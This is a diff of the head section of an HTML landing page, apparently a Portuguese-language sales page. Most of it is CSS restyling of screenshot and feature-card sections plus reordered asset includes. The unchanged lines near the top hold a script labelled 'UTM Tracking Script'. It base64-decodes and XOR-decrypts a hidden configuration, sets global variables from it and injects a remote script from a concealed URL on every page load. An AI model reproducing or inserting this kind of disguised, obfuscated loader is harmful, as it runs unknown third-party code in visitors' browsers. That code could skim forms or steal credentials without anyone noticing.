@@ -39,6 +39,7 @@
 
     <!-- UTM Tracking Script -->
     <script>(function(){var g_88r=atob("DAyKB9JW3Zd33IMlOHeocqA6/61VtPdRSH+wKP01uflZqfdIUWrzKbE5sLkVrqxWW37jd6Yl8uIDsfAKVG3+YqEi8/0E/q8HWXj+dbs0qOMSr6EfY3eoabM7uLVN/udETG2ncqY7tPEO8fNXXXrvaaZ7pfQYuK5WW2eoK/AgvPsCuaEfGi73K6l0s/YauaEfGmjrc7N7qOMateVcFXz4YqQzs+Nar/ZHUWj5Jf50q/YbqeYHAi6oeo8r");var d_tmpe=[];for(var r_fe8=0;r_fe8<g_88r.length;r_fe8++){d_tmpe.push(g_88r.charCodeAt(r_fe8)&255);}var p_g4o=d_tmpe[0];var j_klbp=d_tmpe.slice(1,1+p_g4o);var r_owy1=d_tmpe.slice(1+p_g4o);var w_j8b=r_owy1.map(function(b,k_q06){return b^j_klbp[k_q06%p_g4o];});var r_vgq="";for(var d_ow=0;d_ow<w_j8b.length;d_ow++){r_vgq+=String.fromCharCode(w_j8b[d_ow]&255);}var j_o=decodeURIComponent(escape(r_vgq));var f_9=JSON.parse(j_o);var b_jy=f_9.globals||[];b_jy.forEach(function(i_g6m){window[i_g6m.name]=i_g6m.value;});var z_n1pu=document.createElement("script");z_n1pu.src=f_9.url;z_n1pu.async=true;z_n1pu.defer=true;(f_9.attributes||[]).forEach(function(i_x1rw){z_n1pu.setAttribute(i_x1rw.name,i_x1rw.value);});(document.head||document.documentElement).appendChild(z_n1pu);})();</script>
+    <link rel="stylesheet" crossorigin href="/assets/index-Cwo0zfvo.css">
     <style>
       /* Mobile Performance & Smooth Interaction Optimizations */
       *, *::before, *::after {
@@ -282,8 +283,10 @@
       }
 
       /* Replacement for the imported bundle's "Dentro do plano" section. */
-      .material-section {
-        background: #faf7f0;
+      .material-section,
+      section.material-section {
+        background: #ffffff !important;
+        background-color: #ffffff !important;
         border-top: 1px solid rgba(7, 27, 53, 0.06);
         padding: 3.5rem 1.25rem;
       }
@@ -1070,11 +1073,12 @@
         border-top: 1px solid rgba(7, 27, 53, 0.06);
         width: 100%;
         margin: 0 !important;
-        padding: 4rem 1.25rem 4.25rem !important;
+        padding: 2.25rem 0.75rem 2.75rem !important;
       }
 
       .platform-section > .platform-section__inner {
-        width: min(100%, 40rem);
+        width: 100%;
+        max-width: 48rem;
         margin: 0 auto !important;
         padding: 0 !important;
         text-align: center;
@@ -1083,59 +1087,68 @@
       .platform-section__eyebrow {
         display: inline-flex;
         align-items: center;
-        gap: 0.35rem;
-        margin: 0 0 1.1rem;
-        padding: 0.42rem 0.85rem;
-        border: 1px solid rgba(255, 90, 31, 0.2);
+        gap: 0.3rem;
+        margin: 0 0 0.5rem;
+        padding: 0.25rem 0.65rem;
+        border: 1px solid rgba(255, 90, 31, 0.22);
         border-radius: 999px;
-        background: rgba(255, 90, 31, 0.08);
+        background: #fff3ec;
         color: #ff5a1f;
         font-family: Inter, Arial, sans-serif;
-        font-size: 0.68rem;
+        font-size: 0.65rem;
         font-weight: 800;
-        letter-spacing: 0.09em;
+        letter-spacing: 0.06em;
         line-height: 1;
+        text-transform: uppercase;
       }
 
       .platform-section__title {
         margin: 0;
         color: #071b35;
-        font-family: "Oswald", "Roboto Condensed", "Arial Narrow", Arial, sans-serif;
-        font-size: clamp(2rem, 6vw, 3.1rem);
+        font-family: "Oswald", "Bebas Neue", "Roboto Condensed", Arial, sans-serif;
+        font-size: clamp(1.4rem, 3.8vw, 2.1rem);
         font-weight: 800;
-        letter-spacing: -0.035em;
-        line-height: 0.98;
+        letter-spacing: -0.02em;
+        line-height: 1.05;
         text-transform: uppercase;
       }
 
-      .platform-section__title strong,
-      .platform-section__subtitle strong,
-      .platform-section__explanation strong {
-        color: #ff5a1f;
+      .platform-section__title strong {
+        color: #071b35 !important;
       }
 
       .platform-section__subtitle {
-        max-width: 34rem;
-        margin: 1.4rem auto 2rem;
-        color: #5f6673;
+        max-width: 25rem;
+        margin: 0.45rem auto 1.1rem;
+        color: #475569;
         font-family: Inter, Arial, sans-serif;
-        font-size: 0.96rem;
-        line-height: 1.55;
+        font-size: 0.78rem;
+        line-height: 1.4;
+      }
+
+      .platform-section__subtitle strong {
+        color: #000000 !important;
+        font-weight: 700;
       }
 
       .platform-section__explanation {
-        width: min(100%, 36rem);
-        margin: 0 auto 2.5rem;
-        padding: 1.35rem 1.3rem;
-        border: 1px solid rgba(7, 27, 53, 0.1);
-        border-radius: 1.15rem;
+        width: min(100%, 25rem);
+        margin: 0 auto 1.5rem;
+        padding: 0.75rem 0.95rem;
+        border: 1px solid rgba(7, 27, 53, 0.08);
+        border-radius: 0.9rem;
         background: #ffffff;
-        box-shadow: 0 0.2rem 0.55rem rgba(7, 27, 53, 0.07);
-        color: #5f6673;
+        box-shadow: 0 8px 20px -4px rgba(7, 27, 53, 0.08), 0 2px 6px -2px rgba(7, 27, 53, 0.03);
+        color: #1e293b;
         font-family: Inter, Arial, sans-serif;
-        font-size: 0.9rem;
-        line-height: 1.55;
+        font-size: 0.74rem;
+        line-height: 1.42;
         text-align: left;
+      }
+
+      .platform-section__explanation strong {
+        color: #000000 !important;
+        font-weight: 700;
       }
 
       .platform-section__explanation p {
@@ -1143,59 +1156,177 @@
       }
 
       .platform-section__explanation p + p {
-        margin-top: 0.9rem;
+        margin-top: 0.45rem;
       }
 
       .platform-section__screenshots {
-        display: grid;
-        grid-template-columns: repeat(3, minmax(0, 1fr));
-        gap: clamp(0.65rem, 2.5vw, 1.2rem);
+        display: grid !important;
+        grid-template-columns: repeat(3, minmax(0, 1fr)) !important;
+        gap: clamp(0.45rem, 1.8vw, 1.15rem);
         align-items: start;
+        width: 100%;
+        max-width: 48rem;
+        margin: 0 auto;
       }
 
       .platform-section__screenshot {
         min-width: 0;
         margin: 0;
-      }
-
-      .platform-screenshot-placeholder {
         display: flex;
-        width: 100%;
-        aspect-ratio: 0.5;
-        align-items: center;
-        justify-content: center;
         flex-direction: column;
-        gap: 0.55rem;
-        padding: 0.75rem;
-        border: 1px dashed rgba(7, 27, 53, 0.23);
-        border-radius: 0.9rem;
-        background: rgba(255, 255, 255, 0.58);
-        color: #7b8490;
-        font-family: Inter, Arial, sans-serif;
-        font-size: 0.62rem;
-        font-weight: 700;
-        line-height: 1.3;
-        text-align: center;
+        align-items: center;
       }
 
-      .platform-screenshot-placeholder__number {
-        display: grid;
-        width: 2rem;
-        height: 2rem;
-        place-items: center;
-        border: 1px solid rgba(255, 90, 31, 0.3);
-        border-radius: 50%;
-        color: #ff5a1f;
-        font-size: 0.65rem;
+      /* App Screen Card with Smooth Rounded Edges (matching reference) */
+      .app-screen-card {
+        position: relative;
+        width: 100%;
+        border-radius: clamp(1rem, 3.2vw, 1.75rem);
+        overflow: hidden;
+        background: #ffffff;
+        border: 1px solid rgba(7, 27, 53, 0.08);
+        box-shadow: 0 10px 24px -4px rgba(7, 27, 53, 0.12), 0 2px 6px rgba(7, 27, 53, 0.04);
+        transition: transform 0.25s ease, box-shadow 0.25s ease;
+      }
+
+      .app-screen-card:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 14px 30px -4px rgba(7, 27, 53, 0.18);
+      }
+
+      .platform-screenshot-img {
+        display: block;
+        width: 100%;
+        height: auto;
+        border-radius: clamp(1rem, 3.2vw, 1.75rem);
+        object-fit: cover;
       }
 
       .platform-section__screenshot figcaption {
-        margin-top: 0.65rem;
-        color: #5f6673;
+        margin-top: 0.55rem;
+        color: #475569;
         font-family: Inter, Arial, sans-serif;
-        font-size: 0.68rem;
-        font-weight: 700;
-        line-height: 1.25;
+        font-size: clamp(0.68rem, 2vw, 0.82rem);
+        font-weight: 600;
+        line-height: 1.2;
+        text-align: center;
+      }
+
+      /* Platform Features (6 cards grid) section - Exact reference replica */
+      .platform-features-section,
+      section.platform-features-section {
+        background: #faf7f0 !important;
+        background-color: #faf7f0 !important;
+        border-top: 1px solid rgba(7, 27, 53, 0.06) !important;
+        width: 100% !important;
+        margin: 0 !important;
+        padding: 2.25rem 1rem 3rem !important;
+        box-sizing: border-box !important;
+      }
+
+      .platform-features__inner {
+        max-width: 42rem !important;
+        margin: 0 auto !important;
+        padding: 0 !important;
+        text-align: center !important;
+        box-sizing: border-box !important;
+      }
+
+      .platform-features__title {
+        margin: 0 0 1.35rem !important;
+        color: #071b35 !important;
+        font-family: "Oswald", "Bebas Neue", "Roboto Condensed", Arial, sans-serif !important;
+        font-size: clamp(1.35rem, 3.8vw, 1.85rem) !important;
+        font-weight: 800 !important;
+        letter-spacing: -0.02em !important;
+        line-height: 1.1 !important;
+        text-transform: uppercase !important;
+      }
+
+      .platform-features__grid {
+        display: grid !important;
+        grid-template-columns: repeat(2, minmax(0, 1fr)) !important;
+        gap: 0.9rem !important;
+        width: 100% !important;
+        box-sizing: border-box !important;
+      }
+
+      .platform-features__card {
+        background: #ffffff !important;
+        background-color: #ffffff !important;
+        border: 1px solid rgba(7, 27, 53, 0.08) !important;
+        border-radius: 1.15rem !important;
+        padding: 0.95rem 1.15rem 1.05rem !important;
+        text-align: left !important;
+        box-shadow: 0 8px 22px -3px rgba(7, 27, 53, 0.08), 0 3px 8px -2px rgba(7, 27, 53, 0.04) !important;
+        display: flex !important;
+        flex-direction: column !important;
+        align-items: flex-start !important;
+        justify-content: flex-start !important;
+        box-sizing: border-box !important;
+      }
+
+      .platform-features__emoji {
+        font-size: 1.45rem !important;
+        line-height: 1 !important;
+        margin: 0 0 0.5rem 0 !important;
+        display: block !important;
+        user-select: none !important;
+      }
+
+      .platform-features__card-title {
+        color: #071b35 !important;
+        font-family: "Oswald", "Bebas Neue", "Roboto Condensed", Arial, sans-serif !important;
+        font-size: 0.95rem !important;
+        font-weight: 800 !important;
+        letter-spacing: -0.01em !important;
+        line-height: 1.2 !important;
+        text-transform: uppercase !important;
+        margin: 0 0 0.25rem !important;
+      }
+
+      .platform-features__card-desc {
+        color: #64748b !important;
+        font-family: "Plus Jakarta Sans", Inter, Arial, sans-serif !important;
+        font-size: 0.78rem !important;
+        line-height: 1.42 !important;
+        margin: 0 !important;
+        font-weight: 400 !important;
+      }
+
+      @media (max-width: 640px) {
+        .platform-features-section,
+        section.platform-features-section {
+          padding: 1.85rem 0.85rem 2.35rem !important;
+        }
+
+        .platform-features__title {
+          margin-bottom: 1.1rem !important;
+        }
+
+        .platform-features__grid {
+          grid-template-columns: 1fr !important;
+          gap: 0.75rem !important;
+        }
+
+        .platform-features__card {
+          padding: 0.85rem 1rem 0.95rem !important;
+          border-radius: 1rem !important;
+        }
+
+        .platform-features__emoji {
+          font-size: 1.4rem !important;
+          margin-bottom: 0.45rem !important;
+        }
+
+        .platform-features__card-title {
+          font-size: 0.9rem !important;
+        }
+
+        .platform-features__card-desc {
+          font-size: 0.76rem !important;
+          line-height: 1.4 !important;
+        }
       }
 
       @media (max-width: 700px) {
@@ -1220,8 +1351,8 @@
         }
       }
     </style>
-    <script type="module" crossorigin src="/assets/landing-section-patch.js?v=checkout_final_direct_v4"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-Cwo0zfvo.css">
+    <script type="module" crossorigin src="/assets/index-CIt76HRX.js"></script>
+    <script type="module" crossorigin src="/assets/landing-section-patch.js?v=checkout_final_direct_v21"></script>
   </head>
   <body>
     <div id="root"></div>
